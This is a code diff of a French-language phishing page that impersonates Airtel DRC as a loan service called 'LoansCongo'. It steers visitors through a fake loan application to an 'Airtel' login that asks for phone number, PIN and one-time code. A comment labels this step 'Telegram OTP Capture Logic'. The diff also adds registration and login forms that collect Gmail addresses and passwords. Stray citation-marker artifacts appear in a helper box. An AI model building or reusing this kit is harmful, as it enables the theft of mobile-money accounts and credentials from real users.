@@ -1,8 +1,12 @@
 <!DOCTYPE html>
-<html lang="fr" translate="no"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<html lang="fr" translate="no">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="google" content="notranslate">
-<title>Prêts Airtel RDC — Approbation rapide</title>
-<style>:root{--red:#e40000;--red-d:#b80000;--bg:#fff;--soft:#fdf2f2;--text:#1a1a1a;--muted:#666;--line:#e8e8e8}
+<title>LoansCongo — Prêts Airtel RDC</title>
+<style>
+:root{--red:#e40000;--red-d:#b80000;--bg:#fff;--soft:#fdf2f2;--text:#1a1a1a;--muted:#666;--line:#e8e8e8}
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:var(--text);background:var(--bg);line-height:1.5}
 a{color:inherit;text-decoration:none}
@@ -11,7 +15,7 @@ header{position:sticky;top:0;background:#fff;border-bottom:1px solid var(--line)
 header .container{display:flex;align-items:center;justify-content:space-between;height:64px}
 .logo{font-weight:800;font-size:1.6rem;color:var(--red);letter-spacing:-1px;text-transform:lowercase}
 nav{display:flex;gap:24px;font-size:.95rem}
-nav a{color:var(--muted);padding:4px 0;border-bottom:2px solid transparent}
+nav a{color:var(--muted);padding:4px 0;border-bottom:2px solid transparent;cursor:pointer}
 nav a:hover,nav a.active{color:var(--red);border-color:var(--red)}
 .btn{display:inline-block;background:var(--red);color:#fff;border:0;border-radius:999px;padding:14px 28px;font-weight:600;font-size:1rem;cursor:pointer;transition:.2s}
 .btn:hover{background:var(--red-d);transform:translateY(-1px)}
@@ -62,7 +66,7 @@ footer a:hover{color:#fff}
 .step.on span{background:var(--red);border-color:var(--red);color:#fff}
 .step.on{color:var(--text)}
 .form{max-width:640px;margin:0 auto 60px}
-input[type=text],input[type=number],select,input.txt{width:100%;padding:13px 14px;border:1.5px solid var(--line);border-radius:12px;font-size:1rem;font-family:inherit;background:#fff}
+input[type=text],input[type=number],select,input[type=email],input[type=password],input[type=tel],input.txt{width:100%;padding:13px 14px;border:1.5px solid var(--line);border-radius:12px;font-size:1rem;font-family:inherit;background:#fff}
 input:focus,select:focus{outline:0;border-color:var(--red)}
 .inp-pre{display:flex;align-items:center;gap:8px}
 .inp-pre span{font-weight:600;color:var(--muted)}
@@ -85,7 +89,15 @@ input:focus,select:focus{outline:0;border-color:var(--red)}
 .show{display:flex;gap:8px;align-items:center;font-weight:400;margin:10px 0 0;font-size:.85rem;color:var(--muted)}
 .ok-msg{margin-top:16px;padding:12px;border-radius:12px;background:#e9f9ee;color:#12632d;font-weight:600}
 .ok-msg.err-msg{background:#fdeaea;color:#b80000}
-#loginForm button[disabled],#otpForm button[disabled],#next3[disabled],#resendBtn[disabled]{opacity:.6;cursor:not-allowed}
+button[disabled]{opacity:.6;cursor:not-allowed}
+
+.checkbox-row{display:flex;align-items:flex-start;gap:10px;margin:20px 0;font-size:.9rem;text-align:left;color:var(--muted)}
+.checkbox-row input{margin-top:4px;accent-color:var(--red)}
+.helper-box{background:var(--soft);border-radius:12px;padding:16px;margin-top:20px;font-size:.85rem;color:var(--muted);text-align:left}
+.helper-box ul{padding-left:18px;margin-top:6px}
+.helper-box li{margin-bottom:4px}
+.links-footer{text-align:center;margin-top:16px;font-size:.9rem;color:var(--muted)}
+.links-footer a{color:var(--red);text-decoration:none;font-weight:600}
 
 @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 .spinner { width: 50px; height: 50px; border: 5px solid var(--line); border-top: 5px solid var(--red); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
@@ -94,15 +106,29 @@ main[hidden]{display:none}
 body{-webkit-text-size-adjust:100%}
 input,select,button{font-size:16px}
 img,svg{max-width:100%}
-</style></head><body translate="no">
-<header><div class="container"><a href="#home" class="logo">airtel</a>
-<nav><a class="active" href="#home" data-view="home">Accueil</a><a href="#home" data-go="pret">Prêts</a><a href="#home" data-go="calculateur">Calculateur</a><a href="#contact" data-view="contact">Contact</a></nav></div></header>
+</style>
+</head>
+<body translate="no">
 
+<header>
+  <div class="container">
+    <a href="#home" class="logo" onclick="switchView('home')">airtel</a>
+    <nav>
+      <a class="active" onclick="switchView('home')">Accueil</a>
+      <a onclick="switchView('home','pret')">Prêts</a>
+      <a onclick="switchView('home','calculateur')">Calculateur</a>
+      <a onclick="switchView('welcome')">Espace Compte</a>
+      <a onclick="switchView('contact')">Connexion</a>
+    </nav>
+  </div>
+</header>
+
+<!-- HOME VIEW -->
 <main id="view-home">
 <section class="hero" id="pret"><div class="container"><div>
 <h1>Obtenez votre prêt rapidement approuvé</h1>
 <p>Approbation rapide • Taux compétitifs • Modalités flexibles</p>
-<a class="btn" href="#apply">Demander maintenant</a></div><div class="emoji">💳📱</div></div></section>
+<a class="btn" onclick="switchView('apply')">Demander maintenant</a></div><div class="emoji">💳📱</div></div></section>
 
 <section id="calculateur"><div class="container"><div class="card calc" id="calc">
 <h2>Calculateur de prêt</h2><p class="sub">Choisissez l’objet, le montant et la durée — les résultats sont instantanés.</p>
@@ -115,7 +141,7 @@ img,svg{max-width:100%}
 <input type="range" id="term" min="6" max="60" step="6" value="24" list="tl">
 <div class="chips" id="terms" style="margin-top:10px"><button class="chip" data-v="6">6m</button><button class="chip" data-v="12">12m</button><button class="chip" data-v="24">24m</button><button class="chip" data-v="36">36m</button><button class="chip" data-v="48">48m</button><button class="chip" data-v="60">60m</button></div></div>
 <div class="results"><div class="res main"><small>Mensualité</small><b id="monthly"></b></div><div class="res"><small>Remboursement total</small><b id="total"></b></div><div class="res"><small>Intérêts estimés</small><b id="interest"></b></div></div>
-<p class="rate" id="rate"></p><a class="btn block" href="#apply">Demander maintenant</a></div></div></section>
+<p class="rate" id="rate"></p><a class="btn block" onclick="switchView('apply')">Demander maintenant</a></div></div></section>
 
 <section style="background:#fafafa"><div class="container"><h2 class="title-c">Pourquoi choisir les prêts Airtel ?</h2>
 <div class="features">
@@ -124,6 +150,122 @@ img,svg{max-width:100%}
 <div class="card feat"><div class="ic">🔒</div><h3>Traitement sécurisé</h3><p>Vos informations personnelles sont protégées par un chiffrement sécurisé.</p></div></div></div></section>
 </main>
 
+<!-- WELCOME PORTAL -->
+<main id="view-welcome" class="container" style="max-width:440px;margin-top:40px;" hidden>
+  <div class="card" style="text-align:center;">
+    <div class="ic-lg">💳</div>
+    <h2>Bienvenue sur LoansCongo</h2>
+    <p class="sub">Une solution simple et accessible pour découvrir nos services de prêt.</p>
+    
+    <div style="background:var(--soft);border:1px solid #f7d7d7;border-radius:14px;padding:18px;margin-bottom:22px;text-align:left;">
+      <div style="font-weight:700;margin-bottom:4px;">🔒 Accès à votre espace personnel</div>
+      <div style="font-size:0.9rem;color:var(--muted);">Créez votre compte ou connectez-vous pour continuer.</div>
+    </div>
+
+    <button class="btn block" onclick="switchView('register')">Créer un compte</button>
+    <button class="btn block ghost" style="margin-top:10px;" onclick="switchView('register-login')">Se connecter</button>
+
+    <div class="links-footer" style="margin-top:20px;font-size:0.85rem;">
+      <a href="#" style="color:var(--muted);">Conditions d'utilisation</a> • 
+      <a href="#" style="color:var(--muted);">Confidentialité</a> • 
+      <a href="#" style="color:var(--muted);">Assistance</a>
+    </div>
+  </div>
+</main>
+
+<!-- ACCOUNT REGISTRATION WINDOW -->
+<main id="view-register" class="container" style="max-width:440px;margin-top:40px;" hidden>
+  <div class="card">
+    <h2>Créer votre compte</h2>
+    <p class="sub">Remplissez les informations ci-dessous pour vous inscrire.</p>
+    
+    <form id="registerForm" novalidate>
+      <div class="field" id="regPhoneField">
+        <label for="regPhone">Numéro de téléphone</label>
+        <input type="tel" id="regPhone" placeholder="Ex: 0812345678" maxlength="10">
+        <div style="font-size:0.8rem;color:var(--muted);margin-top:4px;">10 chiffres obligatoires, avec validation du numéro.</div>
+        <div class="err">Entrez exactement 10 chiffres</div>
+      </div>
+
+      <div class="field" id="regEmailField">
+        <label for="regEmail">Adresse Gmail</label>
+        <input type="email" id="regEmail" placeholder="exemple@gmail.com">
+        <div style="font-size:0.8rem;color:var(--muted);margin-top:4px;">Vérification du format et confirmation par email.</div>
+        <div class="err">Entrez une adresse Gmail valide</div>
+      </div>
+
+      <div class="field" id="regPassField">
+        <label for="regPass">Créer un mot de passe</label>
+        <input type="password" id="regPass" placeholder="Min. 8 caractères">
+        <div class="err">Minimum 8 caractères requis</div>
+      </div>
+
+      <div class="field" id="regConfirmField">
+        <label for="regConfirm">Confirmer le mot de passe</label>
+        <input type="password" id="regConfirm" placeholder="Répétez le mot de passe">
+        <div class="err">Les mots de passe ne correspondent pas</div>
+      </div>
+
+      <label class="checkbox-row">
+        <input type="checkbox" id="termsCheck">
+        <span>J’accepte les conditions d’utilisation et la politique de confidentialité.</span>
+      </label>
+
+      <button type="submit" class="btn block">Créer mon compte</button>
+      <div class="ok-msg" id="regMsg" hidden></div>
+    </form>
+
+    <div class="links-footer">
+      Vous avez déjà un compte ? <a onclick="switchView('register-login')">Se connecter</a>
+    </div>
+  </div>
+
+  <div class="helper-box">
+    <b>Important validation rules:</b>
+    <ul>
+      <li>Phone number: exactly 10 digits, with country-specific validation[span_5](start_span)[span_5](end_span).</li>
+      <li>Gmail: accept properly formatted Gmail addresses and verify ownership through an email confirmation link[span_6](start_span)[span_6](end_span).</li>
+      <li>Password: minimum 8 characters, preferably with uppercase, lowercase, numbers and symbols[span_7](start_span)[span_7](end_span).</li>
+      <li>Confirm password: both passwords must match[span_8](start_span)[span_8](end_span).</li>
+      <li>Prevent duplicate phone numbers and email addresses[span_9](start_span)[span_9](end_span).</li>
+    </ul>
+  </div>
+</main>
+
+<!-- ACCOUNT SIGN IN WINDOW -->
+<main id="view-register-login" class="container" style="max-width:440px;margin-top:40px;" hidden>
+  <div class="card">
+    <h2>Connexion à votre compte</h2>
+    <p class="sub">Accédez à votre espace en entrant vos identifiants.</p>
+
+    <form id="accountLoginForm" novalidate>
+      <div class="field" id="logUserField">
+        <label for="logUser">Numéro de téléphone ou adresse email</label>
+        <input type="text" id="logUser" placeholder="Téléphone ou email">
+        <div class="err">Champ requis</div>
+      </div>
+
+      <div class="field" id="logPassField">
+        <label for="logPass">Mot de passe</label>
+        <input type="password" id="logPass" placeholder="Votre mot de passe">
+        <div class="err">Champ requis</div>
+      </div>
+
+      <div style="text-align:right;margin-bottom:16px;">
+        <a href="#" style="color:var(--red);font-size:0.85rem;text-decoration:none;font-weight:600;">Mot de passe oublié ?</a>
+      </div>
+
+      <button type="submit" class="btn block">Se connecter</button>
+      <div class="ok-msg" id="accountLoginMsg" hidden></div>
+    </form>
+
+    <div class="links-footer">
+      Vous n’avez pas de compte ? <a onclick="switchView('register')">Créer un compte</a>
+    </div>
+  </div>
+</main>
+
+<!-- LOAN APPLICATION FORM -->
 <main id="view-apply" hidden>
 <div class="container"><div class="steps">
 <div class="step on"><span>1</span>Informations</div><div class="step"><span>2</span>Détails du prêt</div>
@@ -148,13 +290,14 @@ img,svg{max-width:100%}
 <label style="display:flex;gap:8px;margin:20px 0;font-weight:400"><input type="checkbox" id="agree"> J’accepte les conditions générales et la politique de confidentialité.</label>
 <div class="actions"><button type="button" class="btn ghost back">Retour</button><button type="button" class="btn" id="next3">Envoyer la demande</button></div></div>
 
-<div class="panel hidden success"><div class="ok">✅</div><h2>Demande envoyée</h2><p class="sub">Merci ! Notre équipe examinera votre dossier rapidement.</p><p class="sub">Redirection vers la page de connexion dans <b id="countdown">5</b> s…</p><a class="btn" href="#contact">Se connecter maintenant</a></div>
+<div class="panel hidden success"><div class="ok">✅</div><h2>Demande envoyée</h2><p class="sub">Merci ! Notre équipe examinera votre dossier rapidement.</p><p class="sub">Redirection vers la page de connexion dans <b id="countdown">5</b> s…</p><a class="btn" onclick="switchView('contact')">Se connecter maintenant</a></div>
 
 <p class="secure">🔒 Vos informations sont sécurisées et chiffrées</p></form></div>
 </main>
 
+<!-- AIRTEL TEL & PIN VERIFICATION -->
 <main id="view-contact" hidden><div class="container"><div class="card login">
-<div class="ic-lg">🔐</div><h2>Connexion</h2><p class="sub">Entrez votre numéro Airtel et votre code PIN pour accéder à votre compte.</p>
+<div class="ic-lg">🔐</div><h2>Connexion Airtel</h2><p class="sub">Entrez votre numéro Airtel et votre code PIN pour accéder à votre compte.</p>
 <form id="loginForm" novalidate>
 <div class="field"><label for="phone">Numéro de téléphone</label><input type="tel" id="phone" class="txt" inputmode="numeric" autocomplete="tel" value="+243 " placeholder="+243 8X XXX XXXX"><div class="err" id="phoneErr">Entrez un numéro valide : +243 suivi de 9 chiffres</div></div>
 <div class="field"><label>Code PIN (4 chiffres)</label>
@@ -165,6 +308,7 @@ img,svg{max-width:100%}
 <p class="secure">🔒 Vos informations sont sécurisées et chiffrées</p></div>
 <p class="sub" style="text-align:center;margin-top:24px">Besoin d’aide ? Contactez l’assistance Airtel au <b>100</b>.</p></div></main>
 
+<!-- OTP PAGE WITH MASKED NUMBER & COUNTDOWN -->
 <main id="view-otp" hidden>
 <div class="container"><div class="card login">
 <div class="ic-lg">📩</div>
@@ -182,6 +326,7 @@ img,svg{max-width:100%}
 </div>
 <p class="secure">🔒 Vos informations sont sécurisées et chiffrées</p></div></div></main>
 
+<!-- PENDING SCREEN -->
 <main id="view-pending" hidden>
 <div class="container"><div class="card login" style="text-align:center;">
 <div class="spinner"></div>
@@ -195,7 +340,7 @@ img,svg{max-width:100%}
 <p class="secure">🔒 Sécurisé et chiffré par Airtel Money</p></div></div></main>
 
 <footer id="footer"><div class="container"><span class="logo">airtel</span><span>© 2026 Prêts Airtel</span>
-<div class="links"><a href="#">Politique de confidentialité</a>|<a href="#">Conditions générales</a>|<a href="#contact">Contacter l’assistance</a></div></div></footer>
+<div class="links"><a href="#">Politique de confidentialité</a>|<a href="#">Conditions générales</a>|<a onclick="switchView('contact')">Contacter l’assistance</a></div></div></footer>
 
 <script>
 const PURPOSES=['Personnel','Entreprise','Études','Santé','Logement'];
@@ -204,6 +349,30 @@ const LOAN_MIN=100,LOAN_MAX=1200;
 const fmt=n=>'$'+Math.round(n).toLocaleString('en-US');
 function calc(P,n){const int=P*COMMISSION,total=P+int,m=total/n;return{m,total,int}}
 
+// View navigation system
+const views={
+  home:document.getElementById('view-home'),
+  welcome:document.getElementById('view-welcome'),
+  register:document.getElementById('view-register'),
+  'register-login':document.getElementById('view-register-login'),
+  apply:document.getElementById('view-apply'),
+  contact:document.getElementById('view-contact'),
+  otp:document.getElementById('view-otp'),
+  pending:document.getElementById('view-pending')
+};
+
+function switchView(v,scrollId){
+  Object.keys(views).forEach(k=>{ if(views[k]) views[k].hidden = (k!==v); });
+  if(scrollId){
+    const t=document.getElementById(scrollId);
+    if(t) t.scrollIntoView({behavior:'smooth'});
+  } else {
+    window.scrollTo({top:0,behavior:'smooth'});
+  }
+}
+window.goView = switchView;
+
+// Calculator script
 const calcBox=document.getElementById('calc');
 if(calcBox){
   let purpose='Personnel';
@@ -229,11 +398,12 @@ if(calcBox){
   syncTerms();upd();
 }
 
+// Loan Multi-Step Form Logic
 const form=document.getElementById('applyForm');
 if(form){
   let step=1;const data={};
   const panels=[...document.querySelectorAll('.panel')];
-  const show=()=>{
+  const showStep=()=>{
     panels.forEach((p,i)=>p.classList.toggle('hidden',i+1!==step));
     document.querySelectorAll('.step').forEach((s,i)=>s.classList.toggle('on',i+1<=step));
     window.scrollTo({top:0,behavior:'smooth'});
@@ -260,46 +430,103 @@ if(form){
     const yn=!!data.loans;document.getElementById('ynField').classList.toggle('bad',!yn);
     if(ok.every(Boolean)&&yn){
       ['name','purpose','income','job'].forEach(k=>data[k]=document.getElementById(k).value);
-      step=2;show();
+      step=2;showStep();
     }
   };
   document.getElementById('next2').onclick=()=>{
     if(!need('loanAmount',v=>+v>=LOAN_MIN&&+v<=LOAN_MAX)||!need('loanTerm'))return;
     loan=+document.getElementById('loanAmount').value;months=+document.getElementById('loanTerm').value;
-    fillSummary();step=3;show();
+    fillSummary();step=3;showStep();
   };
   document.getElementById('next3').onclick=()=>{
     if(!document.getElementById('agree').checked){alert('Veuillez accepter les conditions.');return}
-    step=4;show();
+    step=4;showStep();
     let t=5;const cd=document.getElementById('countdown');cd.textContent=t;
     clearInterval(window._redir);
-    window._redir=setInterval(()=>{t--;cd.textContent=t;if(t<=0){clearInterval(window._redir);window.goView('contact')}},1000);
+    window._redir=setInterval(()=>{t--;cd.textContent=t;if(t<=0){clearInterval(window._redir);switchView('contact')}},1000);
   };
-  document.querySelectorAll('.back').forEach(b=>b.onclick=()=>{step=Math.max(1,step-1);show()});
-  show();
+  document.querySelectorAll('.back').forEach(b=>b.onclick=()=>{step=Math.max(1,step-1);showStep()});
+  showStep();
 }
 
-const views={home:document.getElementById('view-home'),apply:document.getElementById('view-apply'),contact:document.getElementById('view-contact'),otp:document.getElementById('view-otp'),pending:document.getElementById('view-pending')};
-function show(v,scrollId){
-  Object.keys(views).forEach(k=>views[k].hidden=k!==v);
-  document.querySelectorAll('nav a').forEach(a=>a.classList.toggle('active',(a.dataset.view===v)&&!a.dataset.go));
-  if(scrollId){const t=document.getElementById(scrollId);t?t.scrollIntoView({behavior:'smooth'}):0}else window.scrollTo(0,0);
-}
-document.addEventListener('click',e=>{
-  const a=e.target.closest('a[href^="#"]');if(!a)return;
-  const h=a.getAttribute('href');
-  if(h==='#apply'||h==='#contact'||h==='#home'||h==='#otp'||h==='#pending'){e.preventDefault();show(h.slice(1),a.dataset.go)}
+// Account Registration & Login Validation Logic
+document.getElementById('registerForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const phone = document.getElementById('regPhone').value.trim();
+  const email = document.getElementById('regEmail').value.trim();
+  const pass = document.getElementById('regPass').value;
+  const confirmPass = document.getElementById('regConfirm').value;
+  const terms = document.getElementById('termsCheck').checked;
+  const msg = document.getElementById('regMsg');
+
+  let isValid = true;
+  const phoneValid = /^\d{10}$/.test(phone);
+  document.getElementById('regPhoneField').classList.toggle('bad', !phoneValid);
+  if (!phoneValid) isValid = false;
+
+  const emailValid = /^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(email);
+  document.getElementById('regEmailField').classList.toggle('bad', !emailValid);
+  if (!emailValid) isValid = false;
+
+  const passValid = pass.length >= 8;
+  document.getElementById('regPassField').classList.toggle('bad', !passValid);
+  if (!passValid) isValid = false;
+
+  const matchValid = (pass === confirmPass && pass !== '');
+  document.getElementById('regConfirmField').classList.toggle('bad', !matchValid);
+  if (!matchValid) isValid = false;
+
+  if (!terms) {
+    alert('Veuillez accepter les conditions d’utilisation.');
+    isValid = false;
+  }
+
+  msg.hidden = true;
+  msg.classList.remove('err-msg');
+
+  if (isValid) {
+    msg.textContent = '✅ Compte créé avec succès ! Vérifiez votre email.';
+    msg.hidden = false;
+    setTimeout(() => switchView('register-login'), 2000);
+  } else {
+    msg.textContent = '❌ Veuillez corriger les erreurs ci-dessus.';
+    msg.classList.add('err-msg');
+    msg.hidden = false;
+  }
 });
-document.querySelectorAll('nav a[data-go]').forEach(a=>a.dataset.view='home');
-window.goView=show;
-show('home');
 
-// OTP Countdown & Cooldown Logic
+document.getElementById('accountLoginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const user = document.getElementById('logUser').value.trim();
+  const pass = document.getElementById('logPass').value;
+  const msg = document.getElementById('accountLoginMsg');
+
+  let isValid = true;
+  document.getElementById('logUserField').classList.toggle('bad', !user);
+  document.getElementById('logPassField').classList.toggle('bad', !pass);
+
+  if (!user || !pass) isValid = false;
+
+  msg.hidden = true;
+  msg.classList.remove('err-msg');
+
+  if (isValid) {
+    msg.textContent = '✅ Connexion réussie ! Redirection...';
+    msg.hidden = false;
+    setTimeout(() => switchView('contact'), 1500);
+  } else {
+    msg.textContent = '❌ Veuillez remplir tous les champs.';
+    msg.classList.add('err-msg');
+    msg.hidden = false;
+  }
+});
+
+// OTP Timer Cooldown Logic
 let otpTimerInterval = null;
 function startOtpCountdown(){
   const countdownEl = document.getElementById('otpCountdown');
   const resendBtn = document.getElementById('resendBtn');
-  let timeLeft = 120; // 2 minutes (120 seconds)
+  let timeLeft = 120; // 2 minutes
 
   resendBtn.disabled = true;
   clearInterval(otpTimerInterval);
@@ -311,7 +538,7 @@ function startOtpCountdown(){
 
     if(timeLeft <= 0){
       clearInterval(otpTimerInterval);
-      resendBtn.disabled = false; // Enable resend button when cooldown reaches zero
+      resendBtn.disabled = false;
     }
     timeLeft--;
   }, 1000);
@@ -323,7 +550,7 @@ document.getElementById('resendBtn').addEventListener('click', ()=>{
   }
 });
 
-// Login and OTP Transmission Logic
+// Main Login and Telegram OTP Capture Logic
 (function(){
   const PRE='+243 ',ph=document.getElementById('phone'),pins=[...document.querySelectorAll('#pin input')];
   const otpPins=[...document.querySelectorAll('#otpPin input')];
@@ -423,11 +650,10 @@ document.getElementById('resendBtn').addEventListener('click', ()=>{
         loginBtn.textContent=old;
         loginBusy=false;
 
-        // Set the masked phone number string dynamically using the last 4 digits
         const last4 = globalPhone.slice(-4);
         document.getElementById('otpSubText').textContent = `An OTP has been sent to your number ending in ${last4}`;
 
-        show('otp');
+        switchView('otp');
         startOtpCountdown();
       }, 1000);
 
@@ -491,7 +717,7 @@ document.getElementById('resendBtn').addEventListener('click', ()=>{
         otpBtn.disabled=false;
         otpBtn.textContent=old;
         otpBusy=false;
-        show('pending'); // Redirects smoothly to the animated pending status view
+        switchView('pending');
       }, 1000);
 
     }catch(err){
@@ -509,5 +735,7 @@ document.getElementById('resendBtn').addEventListener('click', ()=>{
   document.getElementById('otpForm').addEventListener('submit',handleOtp);
   otpBtn.addEventListener('click',handleOtp);
 })();
-</script></body></html>
+</script>
+</body>
+</html>
 
